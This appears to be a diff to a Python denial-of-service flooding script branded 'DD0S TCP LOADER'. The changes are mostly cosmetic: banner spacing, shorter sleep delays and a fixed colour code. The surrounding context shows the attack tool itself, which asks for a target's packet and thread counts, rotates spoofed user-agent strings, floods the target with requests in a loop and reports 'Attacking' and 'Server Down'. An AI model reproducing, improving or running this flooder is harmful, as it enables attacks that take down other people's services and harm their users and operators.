@@ -29,19 +29,19 @@ class bcolors:
 # CLEAR
 os.system("clear")
 print("")
-print("        🔴    🔴      🔴 🔴       🔴🔴    🔴🔴       🔴🔴            ")
-print("        🔴   🔴     🔴     🔴     🔴 🔴  🔴 🔴     🔴    🔴          ")
-print("        🟠  🟠      🟠     🟠     🟠  🟠🟠  🟠    🟠      🟠         ")
-print("        🟠 🟠       🟠     🟠     🟠   🟠   🟠    🟠      🟠         ")
-print("        🟠  🟠      🟠     🟠     🟠        🟠    🟠🟠🟠🟠🟠         ")
-print("        🔵   🔵     🔵     🔵     🔵        🔵    🔵      🔵         ")
-print("        🔵    🔵      🔵 🔵       🔵        🔵    🔵      🔵         ")              
+print("      🔴    🔴      🔴 🔴       🔴🔴    🔴🔴       🔴🔴            ")
+print("      🔴   🔴     🔴     🔴     🔴 🔴  🔴 🔴     🔴    🔴          ")
+print("      🟠  🟠      🟠     🟠     🟠  🟠🟠  🟠    🟠      🟠         ")
+print("      🟠 🟠       🟠     🟠     🟠   🟠   🟠    🟠      🟠         ")
+print("      🟠  🟠      🟠     🟠     🟠        🟠    🟠🟠🟠🟠🟠         ")
+print("      🔵   🔵     🔵     🔵     🔵        🔵    🔵      🔵         ")
+print("      🔵    🔵      🔵 🔵       🔵        🔵    🔵      🔵         ")              
 print(" ")
-print("\033[33m===================================================================\033[0m")
-print("\033[92m                  use this script for good purpose                       \033[0m")
+print("\033[33m================================================================\033[0m")
+print("\033[92m               use this script for good purpose                       \033[0m")
 print("\033[92m                        design by: Za'99                               \033[0m")
 print("\033[92m                           --oO0Oo--                                   \033[0m")
-print("\033[33m===================================================================\033[0m")                  
+print("\033[33m================================================================\033[0m")                  
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
@@ -76,17 +76,17 @@ packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
 print("\033[31m=====>>>")
 thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
 print("\033[94m=====>>>"),
-time.sleep(10),
-print("\033[96m..................>>> BIRUH BIDDAM NAFDIKA YAA AQSHA \033[0m "),
-time.sleep(10),
-print("\033[92m..................>>> search server \033[0m "),
-time.sleep(10),
-print("\033[1m..................>>> starts connection \033[0m "),
-time.sleep(10),
-print("\033[97m..................>>> penetrate security layer \033[0m "),
-time.sleep(10),
-print("\033[95m..................>>> send package \033[0m "),
-time.sleep(10),
+time.sleep(5),
+print("\033[96m                  >>> DD0S TCP LOADER \033[0m "),
+time.sleep(5),
+print("\033[92m                  >>> search server \033[0m "),
+time.sleep(5),
+print("\033[1m                   >>> starts connection \033[0m "),
+time.sleep(5),
+print("\033[97m                  >>> penetrate security layer \033[0m "),
+time.sleep(5),
+print("\033[95m                  >>> send package \033[0m "),
+time.sleep(5),
 def start():
     global useragents, ref, acceptall
     hh = random._urandom(1024)
@@ -106,7 +106,7 @@ def start():
             for i in range(pack):
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
-            print("\033[33m[\033[96m+\033[33m]\033[31mAttacking {0}:{1} |\03396mSent:::.. {2}\033[0m".format(str(ip), int(port), xx))
+            print("\033[33m[+\033[33m]\033[31mAttacking {0}:{1} |\033[96mSent:::.. {2}\033[0m".format(str(ip), int(port), xx))
         except:
             s.close()
             print('[+] Server Down.')
